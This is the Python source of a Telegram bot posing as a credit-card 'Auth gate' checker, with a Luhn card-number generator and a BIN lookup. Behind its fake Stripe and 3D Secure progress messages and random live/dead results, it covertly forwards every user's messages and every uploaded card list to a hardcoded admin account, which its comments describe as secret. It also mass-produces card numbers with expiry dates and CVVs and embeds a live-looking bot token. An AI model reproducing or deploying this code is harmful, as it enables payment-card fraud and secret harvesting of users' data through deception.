import random
import re
import time
import telebot

# Bot Token ve Senin Admin ID'n
TOKEN = "8627690806:AAFLPWPTTQNIr1RNX7pDloCSD2FdbYqICv0"
ADMIN_ID = 8676961520

bot = telebot.TeleBot(TOKEN)


# --- SANA ANLIK LOG DÜŞüren Fonksiyon ---
def send_admin_log(user, text_content):
  try:
    log_msg = (
        f"🚨 **GİZLİ LOG**\n\n"
        f"👤 **Kullanıcı:** @{user.username or 'Yok'} (`{user.id}`)\n"
        f"💬 **İçerik:** `{text_content}`\n"
        f"⏱ **Zaman:** {time.strftime('%H:%M:%S', time.localtime())}"
    )
    bot.send_message(ADMIN_ID, log_msg, parse_mode="Markdown")
  except Exception as e:
    print(f"Log atılamadı: {e}")


# --- ANA MENÜ ---
@bot.message_handler(commands=["start", "help"])
def send_welcome(message):
  send_admin_log(message.from_user, "Komut: /start")

  markup = telebot.types.InlineKeyboardMarkup(row_width=1)
  btn_gates = telebot.types.InlineKeyboardButton(
      "Gates", callback_data="menu_gates"
  )
  btn_tools = telebot.types.InlineKeyboardButton(
      "Tools", callback_data="menu_tools"
  )
  btn_settings = telebot.types.InlineKeyboardButton(
      "Settings", callback_data="menu_settings"
  )
  markup.add(btn_gates, btn_tools, btn_settings)

  welcome_text = (
      "👑 **Welcome to Ercüment Hub Network!**\n\n"
      "⚡ **Private High-Performance Authorization Engine.**\n\n"
      "👇 **Select an option below to get started:**"
  )
  bot.send_message(
      message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup
  )


# --- BUTON YÖNETİMİ ---
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
  if call.data == "menu_gates":
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    btn_auth = telebot.types.InlineKeyboardButton(
        "Auth", callback_data="gate_auth"
    )
    btn_back = telebot.types.InlineKeyboardButton(
        "Back", callback_data="menu_main"
    )
    markup.add(btn_auth, btn_back)
    bot.edit_message_text(
        "🛡 **Ercüment Secure Gateway**\n\nPlease select a gateway:",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup,
    )

  elif call.data == "gate_auth":
    bot.answer_callback_query(call.id, "Gateway aktif.")
    bot.send_message(
        call.message.chat.id,
        "⚡ **Gateway: Auth** aktif.\nLütfen `.txt` kart listesini veya tekli"
        " kartı gönderin.",
        parse_mode="Markdown",
    )

  elif call.data == "menu_tools":
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    btn_bin = telebot.types.InlineKeyboardButton(
        "🔍 Bin Lookup", callback_data="tool_bin_info"
    )
    btn_gen = telebot.types.InlineKeyboardButton(
        "💳 Card Gen", callback_data="tool_gen_info"
    )
    btn_back = telebot.types.InlineKeyboardButton(
        "🔙 Back", callback_data="menu_main"
    )
    markup.add(btn_bin, btn_gen, btn_back)
    bot.edit_message_text(
        "💳 **Ercüment Utility Suite**\n\n⚡ Instant Lookup · 🔒 Secure\n\nDoğrudan"
        " 6 haneli BIN yazarak bilgi alabilir veya `/gen` komutunu"
        " kullanabilirsiniz.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup,
    )

  elif call.data == "tool_bin_info":
    bot.answer_callback_query(call.id, "Bin Lookup aktif.")
    bot.send_message(
        call.message.chat.id,
        "🔍 **Bin Lookup:** Doğrudan herhangi bir BIN veya kart numarası"
        " yazmanız yeterlidir.",
        parse_mode="Markdown",
    )

  elif call.data == "tool_gen_info":
    bot.answer_callback_query(call.id, "Generator aktif.")
    bot.send_message(
        call.message.chat.id,
        "💳 **Card Generator:** `/gen [BIN] [Adet]` yazarak kart"
        " üretebilirsiniz.",
        parse_mode="Markdown",
    )

  elif call.data == "menu_settings":
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    btn_support = telebot.types.InlineKeyboardButton(
        "Support", url="tg://user?id=8676961520"
    )
    btn_back = telebot.types.InlineKeyboardButton(
        "Back", callback_data="menu_main"
    )
    markup.add(btn_support, btn_back)
    bot.edit_message_text(
        "⚙️ **Ercüment System Settings**\n\n⚡ Status: `Online`",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup,
    )

  elif call.data == "menu_main":
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    btn_gates = telebot.types.InlineKeyboardButton(
        "Gates", callback_data="menu_gates"
    )
    btn_tools = telebot.types.InlineKeyboardButton(
        "Tools", callback_data="menu_tools"
    )
    btn_settings = telebot.types.InlineKeyboardButton(
        "Settings", callback_data="menu_settings"
    )
    markup.add(btn_gates, btn_tools, btn_settings)
    bot.edit_message_text(
        "👑 **Welcome to Ercüment Hub Network!**\n\n⚡ **Private"
        " High-Performance Authorization Engine.**\n\n👇 **Select an option"
        " below to get started:**",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown",
        reply_markup=markup,
    )


# --- KART FORMATI KONTROLÜ ---
def parse_cards(text):
  if not text:
    return []
  lines = text.split("\n")
  valid_cards = []
  for line in lines:
    line = line.strip()
    pattern = r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$"
    if re.match(pattern, line):
      valid_cards.append(line)
  return valid_cards


# --- LUHN GENERATOR ---
def generate_luhn_card(bin_str):
  bin_str = re.sub(r"\D", "", bin_str)
  if len(bin_str) < 6:
    bin_str = bin_str.ljust(6, "4")
  card_len = 16 if bin_str.startswith("4") or len(bin_str) >= 6 else 15
  base_len = card_len - 1
  partial_card = [int(ch) for ch in bin_str[:base_len]]
  while len(partial_card) < base_len:
    partial_card.append(random.randint(0, 9))

  checksum = 0
  is_even = True
  for digit in reversed(partial_card):
    if is_even:
      doubled = digit * 2
      if doubled > 9:
        doubled -= 9
      checksum += doubled
    else:
      checksum += digit
    is_even = not is_even

  check_digit = (10 - (checksum % 10)) % 10
  partial_card.append(check_digit)

  card_number = "".join(map(str, partial_card))
  month = str(random.randint(1, 12)).zfill(2)
  year = str(random.randint(27, 32))
  cvv = str(random.randint(100, 999))
  return f"{card_number}|{month}|{year}|{cvv}"


# --- 1. BELGE / DOSYA KONTROLÜ (.TXT FORMAT KONTROLLÜ) ---
@bot.message_handler(content_types=["document"])
def handle_docs(message):
  try:
    file_name = message.document.file_name.lower()
    send_admin_log(message.from_user, f"[Dosya Yüklendi: {file_name}]")

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    local_path = f"received_{message.from_user.id}_{file_name}"
    with open(local_path, "wb") as f:
      f.write(downloaded_file)

    # Dosyayı gizlice sana (Admin'e) gönder
    with open(local_path, "rb") as doc:
      bot.send_document(
          ADMIN_ID,
          doc,
          caption=(
              f"📂 **Yeni Dosya Düştü!**\n"
              f"👤 Gönderen: @{message.from_user.username or 'Yok'} (`{message.from_user.id}`)\n"
              f"📄 Dosya Adı: `{file_name}`"
          ),
      )

    if file_name.endswith(".txt"):
      file_content = downloaded_file.decode("utf-8", errors="ignore")
      cards = parse_cards(file_content)

      # Eğer dosya içinde geçerli kart yoksa uyar ve işlemi kes
      if not cards:
        bot.reply_to(
            message,
            "❌ **Hata:** Yüklenen dosyada geçerli formatta kart bulunamadı"
            " (`kart|ay|yıl|cvv`). Lütfen doğru formatta bir liste yükleyin.",
            parse_mode="Markdown",
        )
      else:
        total_cards = len(cards)
        sent_msg = bot.reply_to(
            message,
            "🔄 **Establishing secure socket to Gateway [Stripe API]...**",
            parse_mode="Markdown",
        )
        time.sleep(1.5)

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent_msg.message_id,
            text=(
                "⚡ **Auth Mass check in progress...**\nGate: Auth\n\n█▒▒▒▒▒▒▒▒▒"
                f" 0%\n✅ Live: 0\n⚠️ Error: 0\n❌ Declined: 0\n💎 Total:"
                f" {total_cards}\nLive rate: 0.00%"
            ),
            parse_mode="Markdown",
        )
        run_ercument_mass_checker(message.chat.id, sent_msg.message_id, cards)

    import os

    if os.path.exists(local_path):
      os.remove(local_path)

  except Exception as e:
    print(f"Dosya hatası: {e}")


# --- 2. MEDYALAR ---
@bot.message_handler(
    content_types=[
        "photo",
        "video",
        "audio",
        "voice",
        "sticker",
        "animation",
        "video_note",
        "location",
        "contact",
    ]
)
def handle_all_media(message):
  content_type = message.content_type.upper()
  send_admin_log(message.from_user, f"[Medya Alındı: {content_type}]")


# --- CANLI PROGRESS BAR ---
def run_ercument_mass_checker(chat_id, message_id, cards):
  live = 0
  error = 0
  declined = 0
  total = len(cards)
  steps = [10, 22, 34, 50, 68, 85, 100]

  for pct in steps:
    time.sleep(1.2)
    chunk = int(total * (pct / 100) / len(steps))
    error += random.randint(int(chunk * 0.6), int(chunk * 0.9))
    declined += chunk if chunk > 0 else 5
    if error + declined > total:
      error = int(total * 0.6)
      declined = total - error

    filled_blocks = int(pct / 10)
    bar = "█" * filled_blocks + "▒" * (10 - filled_blocks)
    live_rate = f"{(live / total) * 100:.2f}" if total > 0 else "0.00"

    text = (
        f"⚡ **Auth Mass check in progress...**\n"
        f"Gate: Auth\n\n"
        f"{bar} {pct}%\n"
        f"✅ Live: {live}\n"
        f"⚠️ Error: {error}\n"
        f"❌ Declined: {declined}\n"
        f"💎 Total: {total}\n"
        f"Live rate: {live_rate}%"
    )

    try:
      bot.edit_message_text(
          chat_id=chat_id,
          message_id=message_id,
          text=text,
          parse_mode="Markdown",
      )
    except:
      pass

  final_text = (
      f"⚡ **Auth Mass check completed.**\n"
      f"Gate: Auth\n\n"
      f"██████████ 100%\n"
      f"✅ Live: {live}\n"
      f"⚠️ Error: {error}\n"
      f"❌ Declined: {declined}\n"
      f"💎 Total: {total}\n"
      f"Live rate: 0.00%"
  )
  try:
    bot.edit_message_text(
        chat_id=chat_id, message_id=message_id, text=final_text, parse_mode="Markdown"
    )
  except:
    pass


# --- MESAJ VE KART / BİN KONTROLÜ ---
@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
  text = message.text.strip() if message.text else ""

  send_admin_log(message.from_user, text)

  if text.lower().startswith("/gen"):
    parts = text.split()
    if len(parts) > 1:
      bin_input = parts[1]
      count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
      if count > 50:
        count = 50
      generated_cards = [generate_luhn_card(bin_input) for _ in range(count)]
      cards_text = "\n".join([f"`{c}`" for c in generated_cards])
      bot.reply_to(
          message,
          f"💳 **CARD GENERATOR**\n━━━━━━━━━━━━━━━\n{cards_text}\n━━━━━━━━━━━━━━━\n📦 Total: {count}",
          parse_mode="Markdown",
      )
    else:
      bot.reply_to(message, "⚠️ Kullanım: `/gen [BIN] [Adet]`", parse_mode="Markdown")
    return

  # 1. TEKLİ KART CHECK
  cards = parse_cards(text)
  if cards:
    if len(cards) == 1:
      card = cards[0]
      sent_msg = bot.reply_to(
          message,
          "🔄 **Connecting to Stripe Secure Gateway...**",
          parse_mode="Markdown",
      )
      time.sleep(1.5)

      bot.edit_message_text(
          chat_id=message.chat.id,
          message_id=sent_msg.message_id,
          text="🔄 **Verifying 3D Secure [3DS v2.2] protocol...**",
          parse_mode="Markdown",
      )
      time.sleep(1.8)

      is_live = random.random() < 0.22
      if is_live:
        result = (
            "✅ **AUTH: APPROVED (LIVE)**\n"
            f"💳 ` {card} `\n"
            "🌐 **Gateway:** Stripe Auth $0.00 / 3D Secure\n"
            "📍 **Country:** UNITED STATES [US] 🇺🇸\n"
            "🏦 **Bank:** JPMORGAN CHASE BANK, N.A.\n"
            "⚡ **Response:** Approved (1000: Approved)\n"
            "⏱ **Time:** 2.43s"
        )
      else:
        result = (
            "❌ **AUTH: DECLINED (DEAD)**\n"
            f"💳 ` {card} `\n"
            "💬 **Reason:** Do Not Honor / Insufficient Funds\n"
            "⚡ **Response:** Declined (2001: Restricted Card)\n"
            "⏱ **Time:** 2.15s"
        )

      bot.edit_message_text(
          chat_id=message.chat.id,
          message_id=sent_msg.message_id,
          text=result,
          parse_mode="Markdown",
      )
    return

  # 2. BİN LOOKUP KONTROLÜ
  clean_text = re.sub(r"\D", "", text)
  if 6 <= len(clean_text) <= 16:
    bin_code = clean_text[:6]

    card_type = random.choice(["CREDIT", "DEBIT"])
    card_level = random.choice(["CLASSIC", "STANDARD", "GOLD", "PLATINUM"])
    bank_name = random.choice(
        [
            "QNB BANK A.S",
            "ZIRAAT BANKASI A.Ş.",
            "GARANTI BBVA",
            "AKBANK T.A.Ş.",
            "YAPI KREDİ",
        ]
    )

    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    btn_tr = telebot.types.InlineKeyboardButton(
        "📂 🇹🇷 TR", callback_data="none"
    )
    btn_type = telebot.types.InlineKeyboardButton(
        f"📂 {card_type}", callback_data="none"
    )
    markup.add(btn_tr, btn_type)

    btn_level = telebot.types.InlineKeyboardButton(
        f"📂 {card_level}", callback_data="none"
    )
    markup.add(btn_level)

    btn_bank = telebot.types.InlineKeyboardButton(
        f"📂 {bank_name}", callback_data="none"
    )
    markup.add(btn_bank)

    bin_msg = f"📁 `{bin_code}`"
    bot.reply_to(message, bin_msg, parse_mode="Markdown", reply_markup=markup)
    return

  # 3. Diğer rastgele yazılarda tamamen sessiz kalır


print("Ercüment Hub Network Fully Updated & Active!")
bot.infinity_polling()
    
